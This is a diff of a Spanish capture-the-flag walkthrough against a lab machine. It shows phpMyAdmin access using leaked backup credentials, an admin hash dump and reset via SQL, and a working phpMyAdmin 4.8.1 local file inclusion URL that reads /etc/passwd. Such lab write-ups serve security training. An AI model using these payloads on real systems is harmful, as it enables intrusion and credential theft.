@@ -487,7 +487,9 @@ Habiendo encontrado el dominio **datasafe.votenow.local** podemos proceder a ins
 
 En el navegador no se ve nada. Procedamos entonces a realizar una enumeración de ficheros estándard.
 
-Un paso que nos hemos saltado, es el añadir el nuevo dominio encontrado al fichero /etc/hosts.
+Un paso que nos hemos saltado, es el añadir el nuevo dominio encontrado al fichero /etc/hosts. Ese es el motivo por el que al inspeccionar el dominio en el navegador no veíamos nada.
+
+-------------------------------------------------------------------------------
 
 Una vez realizado esto, volvemos a entrar en el navegador, y esta vez, lo que vemos es un panel de login de phpMyAdmin.
 
@@ -497,11 +499,57 @@ Intentamos entrar con las credenciales típicas admin/admin y esto es lo que vem
 
 ![phpmyadmin_nologin.png](phpmyadmin_nologin.png)
 
+-------------------------------------------------------------------------------
+
+Si recordamos, previamente, durante la enumeración de fiheros de backup, encontramos un fichero config.php.bak que contenía unas credenciales.
+
+$dbUser = "votebox";
+$dbPass = "casoj3FFASPsbyoRP";
+
+Probando dichas credenciales, entramos al panel phpMyAdmin.
+
+-------------------------------------------------------------------------------
+
+Una vez dentro, podemos ver la base de datos votebox, y vemos que contiene una tabla users con una 2 columnas, username/password. Dicha tabla solo tiene una entrada:
+
+```
+username | password
+admin | $2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
+```
+
+Mirando con hashid, no nos da información sobre el hash encontrado (lo cual es raro porque es un hash muy típico). Sin embargo sabemos por otras máquinas realizadas que a entrada es un hash realizado con BCrypt2
+
+-------------------------------------------------------------------------------
+
+Una cosa que podemos probar es a cambiar la constraseña del admin en SQL
+
+Generamos una constraseña del mismo tipo 
+
+```bash
+> mkpasswd -m bcrypt 123456
+```
+
+```bash
+$2b$05$I5GSq/A4OaPHH5lmqVowye68Sj8hpuSZJCM9i6kCDplSqC1BFvuFe
+```
+
+E insertamos la nueva contraseña en la tabla:
+
+```sql
+UPDATE `users` SET `password`="$2b$05$I5GSq/A4OaPHH5lmqVowye68Sj8hpuSZJCM9i6kCDplSqC1BFvuFe" WHERE `username`="admin"
+```
+
+Pero de momento esto no sirve para nada. Intentamos entrar con las credenciales admin/123456 en el panel de login, pero no sirve. No tiene nada que ver.
+
+-------------------------------------------------------------------------------
 
 Enumerando de nuevo, vemos varios ficheros que se encuetran disponibles. Sin embargo, la mayoría redirigen al panel de login.
 
+```bash
 > gobuster dir --url datasafe.votenow.local --wordlist /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,htm,sql,ajax,js,bak,php.bak
+```
 
+```bash
 ===============================================================
 Gobuster v3.3
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -556,23 +604,24 @@ Progress: 1984821 / 1985049 (99.99%)
 ===============================================================
 2023/02/01 16:12:55 Finished
 ===============================================================
+```
+-------------------------------------------------------------------------------
 
-http://datasafe.votenow.local/ChangeLog
-
+Mirando http://datasafe.votenow.local/ChangeLog 
 Vemos que la versión de phpMyAdmin parece ser la 4.8.1
 
+```bash
 phpMyAdmin - ChangeLog
 ======================
 
 4.8.1 (2018-05-24)
+```
 
 De hecho en el fichero README que también es accesible, es la versión que pone :D
 
+Por lo tanto, miramos en searchsploit si existe algún exploit para esta versión de phpMyAdmin.
 
-Buscamos en la base de datos de exploits vemos que la versión de php utilizada puede ser vulnerada
-
-> searchsploit phpMyAdmin 4.8.1   
-
+```bash
 ---------------------------------------------------------------- ---------------------------------
  Exploit Title                                                  |  Path
 ---------------------------------------------------------------- ---------------------------------
@@ -581,28 +630,16 @@ phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)     | php/webapps/44
 phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                  | php/webapps/50457.py
 ---------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
+```
+Hay varios exploits, miramos por ejemplo el primero, que nos explica una manera de conseguir un LFI.
 
--------------------------------------------------------------------------------
+Logramos hacer un LFI con la siguiente linea en la url:
 
-Si recordamos, previamente, durante la enumeración de fiheros de backup, encontramos un fichero config.php.bak que contenía unas credenciales.
-
-$dbUser = "votebox";
-$dbPass = "casoj3FFASPsbyoRP";
-
-Probando dichas credenciales, entramos al panel phpMyAdmin.
-
--------------------------------------------------------------------------------
-
-Una vez dentro, podemos ver la base de datos votebox, y vemos que contiene una tabla users con una 2 columnas, username/password. Dicha tabla solo tiene una entrada:
-
-username | password
-admin | $2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
-
-mirando con hashid, no nos da información sobre el hash encontrado.
-
-Por otro lado, aplicando el exploit encontrado en searchsploit, logramos hacer un LFI con la siguiente linea en la url:
+```
 http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../etc/passwd
+```
 
+```bash
 root:x:0:0:root:/root:/bin/bash 
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin 
@@ -626,20 +663,9 @@ chrony:x:998:996::/var/lib/chrony:/sbin/nologin
 apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
 admin:x:1000:1000::/home/admin:/bin/bash
 mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+```
 
--------------------------------------------------------------------------------
 
 select '<?php phpinfo();exit;?>'
-
-podemos probar a cambiar la constraseña del admin en SQL
-
-Generamos una constraseña del mismo tipo 
-
-> mkpasswd -m bcrypt 123456
-$2b$05$I5GSq/A4OaPHH5lmqVowye68Sj8hpuSZJCM9i6kCDplSqC1BFvuFe
-
-E insertamos la nueva contraseña en la tabla:
-
-UPDATE `users` SET `password`="$2b$05$I5GSq/A4OaPHH5lmqVowye68Sj8hpuSZJCM9i6kCDplSqC1BFvuFe" WHERE `username`="admin"
 
 -------------------------------------------------------------------------------
